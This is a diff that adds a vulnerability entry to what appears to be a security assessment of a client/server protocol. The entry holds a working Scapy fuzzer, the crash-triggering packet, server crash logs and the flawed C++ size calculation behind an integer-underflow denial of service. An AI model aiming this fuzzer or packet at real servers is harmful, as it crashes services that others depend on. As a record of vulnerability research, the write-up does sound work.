@@ -734,10 +734,216 @@ V11) A sniffing attack is possible because the server and client connection and 
 				b. Even when the server authenticates the client, the connection can be successful by using the original certificate and key extracted from the client.
 			6-4. The attacker's server now relaying the client's request to the server, and sniff messages.
 
-V12)
+V12)Crash by Integer Underflow related in the packet size
+	Vulnerabilities
+		V12-1. warparound is happened when calculating the payload size in the parse_packet function.
+			CWE-248: Uncaught Exception https://cwe.mitre.org/data/definitions/248.html
+			CWE-191: Integer Underflow (Wrap or Wraparound) https://cwe.mitre.org/data/definitions/191.html
+
+	Compromise Sequence
+		1. type the command "python3 fuzz_tartan.py" to fuzz
+			$ cat fuzz_tartan.py
+			import socket
+			import os
+			import sys
+			import random
+			import shutil
+			import collections
+			from time import sleep
+			from scapy.all import *
+
+			head_len = 0
+			fuzzed_packet_count = 0
+
+			def get_packet(tf):
+				'''
+				' tartan message structure
+				'
+				'   0                   1                   2                   3
+				'   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'  |                        preamble (="SB1T")                     |
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'  |    size (whole packet or protocol message) (little endian)    |
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'  |                           timestamp                           |
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'  |      message type (1000, 1002~1007, 9999) (little endian)     |
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'  |                        protocol meesage                       |
+				'  |                             ....                              |
+				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+				'''
+				global head_len
+
+				random.seed()
+				payload_len = random.randrange(1, 100)
+				msgtype = random.randrange(998, 1010).to_bytes(4, 'little')
+
+				# head_length can be valid (=whole packet size) or invalid (= only protocol message size)
+				if tf: # fuzz [preamble, length(1~100), timestamp, message type(998~1010), protocol message]
+					p = fuzz(Raw(RandBin(size = 4)))/ \
+							Raw(load=(payload_len + head_len).to_bytes(4, 'little'))/ \
+							fuzz(Raw(RandBin(size = 4)))/ \
+							Raw(load=msgtype)/ \
+							fuzz(Raw(RandBin(size=payload_len)))
+				else: # fuzz [length(1~100), timestamp, message type(998~1010), protocol message]
+					p = fuzz(Raw(load="SB1T"))/ \
+							Raw(load=(payload_len + head_len).to_bytes(4, 'little'))/ \
+							fuzz(Raw(RandBin(size = 4)))/ \
+							Raw(load=msgtype)/ \
+							fuzz(Raw(RandBin(size=payload_len)))
+
+				return p.copy() # return deep copy of the fuzzed packet
+
+			def test_tcp_fuzz():
+				global fuzzed_packet_count
+				fuzzed_packets = collections.deque(maxlen=1000) # in order to store the last 1000 fuzzed packets
+
+				try:
+					sleep(3)
+					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					s.connect(('192.168.0.228', 50000)) # conenct to the server
+					ss = StreamSocket(s)
+
+					while True:
+						p = get_packet(random.choice([True, False])) # get a fuzzed packet
+						fuzzed_packets.append(p) # keep the fuzzed packet to store it
+						fuzzed_packet_count += 1
+						print('[pkt_{0:010d}]'.format(fuzzed_packet_count))
+						hexdump(p) # print fuzzed packet
+						print()
+						ss.send(p) # send the fuzzed packet to the server
+						sleep(0.05)
+				except Exception as err:
+					print('error: ', err)
+
+					if err.errno == 111: # found the server crash because the server doesn't open the connection port
+						return -1
+
+					if os.path.exists('./fuzz_packet'): # delete path including the fuzzed packets to reproduce the crash.
+						shutil.rmtree('./fuzz_packet')
+
+					os.mkdir('./fuzz_packet') # make path to store the fuzzed packets
+
+					# save the last fuzzed packets. name ofrmat is pkt_[10 digit with left padding 0]
+					fuzzed_packets.reverse()
+					for i in range(len(fuzzed_packets)):
+						pkt_num = fuzzed_packet_count - i
+						f = open('./fuzz_packet/pkt_' + str(pkt_num).zfill(10), 'wb')
+						f.write(bytes(fuzzed_packets[i]))
+						f.close()
+
+				finally:
+					s.close()
+
+				return 0;
+
+			if __name__ == "__main__":
+				if len(sys.argv) == 2:
+					head_len = int(sys.argv[1])
+
+				if os.path.exists('./fuzz_packet'): # delete path including the fuzzed packets to reproduce the crash.
+					shutil.rmtree('./fuzz_packet')
+
+				while 0 == test_tcp_fuzz(): # do fuzz
+					print("fuzz again")
+
+	Analysis
+		1. Do fuzz - Random [preamble, length(1~100), timestamp, message type(998~1010), protocol message] field in the message described in the team1's presentation document.
+			bkn@DESKTOP-94O1BNS:~/work$ python3 fuzz_tartan.py
+			...
+			0000  53 42 31 54 02 00 00 00 13 16 EB CA EA 03 00 00  SB1T............
+			0010  D4 3D                                            .=
+
+			...
+			0000  2B D8 DB 4E 1E 00 00 00 7C B4 39 BF EE 03 00 00  +..N....|.9.....
+			0010  6D 09 19 9D 3F 8D C9 41 ED 52 EA 18 BE D1 3F CD  m...?..A.R....?.
+			0020  B8 D1 19 E8 0C 21 7B 09 F3 58 C9 4F 16 DE        .....!{..X.O..
+
+			error:  [Errno 104] Connection reset by peer
+
+		2. Connection is terminated by the server. Server logs shows a crash.
+			wait for login....
+			max packet length=1048576 received=18 packet_length=2 timestamp=3404404243 msgtype=1002
+			accumulated packets=18   my_packet_size=2
+			bytes=18, data=[SB1T]
+			pkt header : length=2  head=[SB1T]
+			pkt header : msgtype=1002
+			pkt header : timestamp=-890563053
+			CBaseProtocol::CBaseProtocol() pmsg=0x0x7f301024d8
+			CBaseProtocol::deSerialize()+
+			[libprotobuf FATAL google/protobuf/stubs/stringpiece.cc:50] size too big: 18446744073709551602 details: string length exceeds max size
+			terminate called after throwing an instance of 'google::protobuf::FatalException'
+			  what():  size too big: 18446744073709551602 details: string length exceeds max size
+			Aborted
+
+		3. check the generated the fuzzed packets after fuzzing.
+			bkn@DESKTOP-94O1BNS:~/work$ ls fuzz_packet/
+			...
+			pkt_0000000039  pkt_0000000082  pkt_0000000125  pkt_0000000168  pkt_0000000211  pkt_0000000254
+			pkt_0000000040  pkt_0000000083  pkt_0000000126  pkt_0000000169  pkt_0000000212
+			pkt_0000000041  pkt_0000000084  pkt_0000000127  pkt_0000000170  pkt_0000000213
+			pkt_0000000042  pkt_0000000085  pkt_0000000128  pkt_0000000171  pkt_0000000214
+
+		4. Try to find the packet to reproduce the crash with the 'fuzz_verify.py' file. Send the fuzzed packet one by one using the 'enter' key. If you check the server is crashed, finish verify and keep the packet causing the crash.
+			bkn@DESKTOP-94O1BNS:~/work$ python3 fuzz_verify.py
+			./fuzz_packet/pkt_0000000254
+			b'+\xd8\xdbN\x1e\x00\x00\x00|\xb49\xbf\xee\x03\x00\x00m\t\x19\x9d?\x8d\xc9A\xedR\xea\x18\xbe\xd1?\xcd\xb8\xd1\x19\xe8\x0c!{\t\xf3X\xc9O\x16\xde'
+			enter to send data above
+
+			...
+
+			./fuzz_packet/pkt_0000000248
+			b'SB1T\x02\x00\x00\x00\x13\x16\xeb\xca\xea\x03\x00\x00\xd4='
+			enter to send data above
+			
+		5. We can check the 'pkt_0000000248' cause the crash. So type Ctrl+C to finish "fuzz_verify.py". Do the double confirm the suspicious packet is really reproduce this crash.
+			bkn@DESKTOP-94O1BNS:~/work$ python3
+			Python 3.8.5 (default, May 27 2021, 13:30:53)
+			[GCC 9.3.0] on linux
+			Type "help", "copyright", "credits" or "license" for more information.
+			>>> import socket
+			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			>>> s.connect(('192.168.0.228', 50000))
+			>>> s.sendall(b'SB1T\x02\x00\x00\x00\x13\x16\xeb\xca\xea\x03\x00\x00\xd4=')
+			
+		6. After sending the packet, the crash is happened. So we find the vulnerable packet.
+		7. Analysis the packet
+			53 42 31 54 # SB1T 
+			02 00 00 00 # size 0x2 // original expectation of this value is 0x02 + 16(header_size). But the fuzzer uses it as the payload size.
+			13 16 EB CA # timestamp
+			EA 03 00 00 # msg type 0x3ea = 1002
+			D4 3D       # payload
+
+		8. Check the source codes. We found the crash is happened in the ParseFromArray function. Because the server shows the "CBaseProtocol::deSerialize()+" logs. The deSerialize function is called by parse_packet function. In the function with our packet, the valud of the variable 'payload_size' is to an extremely large positive number. The value goes into the 'serializedBufferSize' variable and it causes the crash.
+			< BaseProtocol.cpp >
+			gboolean 
+			CBaseProtocol::deSerialize(const unsigned char* serializedBuffer, const int serializedBufferSize)
+			{
+				printf("CBaseProtocol::deSerialize()+\n");
+				return pmsg->ParseFromArray(serializedBuffer, serializedBufferSize); // very large serializedBufferSize is set and it cause the crash.
+			}
+			
+			< ProtocolManager.cpp >
+			CBaseProtocol *CProtocolManager::parse_packet(MyPacket *ppkt) {
+				CBaseProtocol *cpkt = nullptr;
+				size_t payload_size = ppkt->hdr.size - sizeof(MyPacketHeader); // payload_size = (unsigned)2 - (unsigned)16. in the vulnerable packet.
+				printf("pkt header : length=%d  head=[%c%c%c%c]\n", ppkt->hdr.size,ppkt->hdr.head[0],ppkt->hdr.head[1],ppkt->hdr.head[2],ppkt->hdr.head[3]);
+				if (ppkt->hdr.head[0]=='S' && ppkt->hdr.head[1]=='B' && ppkt->hdr.head[2]=='1' && ppkt->hdr.head[3]=='T' ) 
+				{
+					printf("pkt header : msgtype=%d\n", ppkt->hdr.msgtype);
+					printf("pkt header : timestamp=%d\n", ppkt->hdr.timestamp);
+					cpkt=create_protocol_instance((MsgReq)ppkt->hdr.msgtype);
+					if (cpkt) cpkt->deSerialize(ppkt->payload, payload_size); // payload_size is too big
+				}
+				return cpkt;
+			}
+	
+V13)
 	Compromise Sequence
 
 	Vulnerabilities
-		V11-1.
+		V13-1.
 
 	Analysis
